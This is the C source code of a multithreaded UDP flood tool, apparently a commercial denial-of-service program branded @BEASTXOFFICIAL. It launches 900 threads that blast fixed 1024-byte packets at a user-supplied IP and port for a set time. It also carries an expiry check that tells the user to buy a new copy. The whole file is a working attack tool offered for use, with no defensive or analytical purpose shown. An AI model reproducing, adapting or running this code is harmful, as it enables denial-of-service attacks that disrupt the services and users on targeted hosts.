#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREADS 900
#define PACKET_SIZE 1024
#define EXPIRY_DATE "27-05-2025"  // DD-MM-YYYY format

struct AttackParams {
    char *ip;
    int port;
    time_t end_time;
};

void banner() {
    printf("\n");
    printf("##########################################\n");
    printf("#        MADE BY @BEASTXOFFICIAL™        #\n");
    printf("##########################################\n\n");
}

int is_expired() {
    struct tm tm_expiry = {0};
    strptime(EXPIRY_DATE, "%d-%m-%Y", &tm_expiry);
    time_t expiry_time = mktime(&tm_expiry);
    time_t now = time(NULL);
    return now > expiry_time;
}

void *udp_flood(void *arg) {
    struct AttackParams *params = (struct AttackParams *)arg;
    struct sockaddr_in target;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    if (inet_aton(params->ip, &target.sin_addr) == 0) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        pthread_exit(NULL);
    }

    // Prepare fixed 'A' payload
    char message[PACKET_SIZE];
    memset(message, 'A', sizeof(message));

    while (time(NULL) < params->end_time) {
        sendto(sock, message, sizeof(message), 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (is_expired()) {
        printf("\n****************************************\n");
        printf("** EXPIRED - BUY FROM @BEASTXOFFICIAL **\n");
        printf("****************************************\n\n");
        return 1;
    }

    banner();

    if (argc != 4) {
        printf("Usage: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    time_t end_time = time(NULL) + duration;

    pthread_t threads[THREADS];
    struct AttackParams params = {ip, port, end_time};

    printf("[+] Starting UDP FLOOD on %s:%d for %d seconds with %d threads\n", ip, port, duration, THREADS);

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_flood, (void *)&params);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[+] Attack Finished. @BEASTXOFFICIAL\n");
    return 0;
}